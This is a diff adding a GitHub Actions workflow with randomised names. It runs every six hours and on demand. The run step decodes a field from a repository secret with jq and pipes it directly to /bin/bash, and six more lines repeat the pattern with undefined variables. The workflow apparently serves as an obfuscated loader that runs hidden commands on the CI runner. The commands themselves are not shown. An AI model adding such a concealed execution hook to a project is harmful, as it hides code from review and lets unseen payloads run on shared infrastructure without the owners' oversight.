@@ -1,0 +1,23 @@
+name: huangsanhe5647
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangsanhe5647
+        env:
+          lszv709: ${{ secrets.lszv709 }}
+        run: |
+          echo $lszv709 | jq -r .zazn975 | /bin/bash
+          echo $gomg45989 | jq -r .hiqht3988 | /bin/bash
+          echo $ymb1 | jq -r .z27691 | /bin/bash
+          echo $obdmm4 | jq -r .tp4 | /bin/bash
+          echo $u589 | jq -r .vzpig91 | /bin/bash
+          echo $h60 | jq -r .d696 | /bin/bash
+          echo $zj4 | jq -r .dka6299 | /bin/bash
+
